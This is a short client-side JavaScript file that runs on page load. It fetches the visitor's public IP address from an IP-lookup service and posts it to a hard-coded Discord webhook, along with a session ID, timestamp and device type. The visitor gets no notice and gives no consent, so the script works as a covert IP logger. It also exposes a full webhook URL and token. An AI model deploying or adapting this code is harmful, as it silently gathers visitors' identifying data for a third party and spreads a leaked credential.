window.addEventListener('load', () => {
    const sessionId = 'session_' + Math.random().toString(36).substr(2, 9);

    function detectDeviceType() {
        const userAgent = navigator.userAgent;
    
        // Patterns to check for mobile devices
        const mobilePattern = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
    
        if (mobilePattern.test(userAgent)) {
            return 'Mobile';
        } else {
            return 'Desktop';
        }
    }

    // This function fetches the IP address asynchronously
    async function fetchIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip; // Correctly return the IP address
        } catch (error) {
            console.error('Error fetching MAGIC:', error);
        }
    }

    const webhookURL = 'https://discord.com/api/webhooks/1205859542080950292/i0wvkk4V7CcUf6llZwBOOvwP-G91vq_d35lQMTl-NT7jkw8lSCJRM7bQXEqOvDAjMDPK';

    // This function waits for the fetched IP and then sends it
    async function sendIpToDiscord() {
        try {
            const ip = await fetchIp(); // Wait for the IP to be fetched
            if (ip) {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `@oleksandrtrincher Your IP address is: **${ip}** sessionId: **${sessionId}** timestamp: **${new Date()}** device: **${detectDeviceType()}**`,
                    }),
                });
    
                if (response.ok) {
                    console.log('Wow');
                } else {
                    // Optionally, handle non-2xx responses here
                    console.error('Failed to send message to Discord. Status:', response.status);
                }
            } else {
                console.error('IP was not fetched successfully.');
            }
        } catch (error) {
            console.error('Error sending IP to Discord:', error);
        }
    }    

    const webhookActive = true;
    // Call the function to send the IP to Discord
    if (webhookActive === true) {
        sendIpToDiscord();
    } else {
        console.log('Webhook is Inactive');
    }
});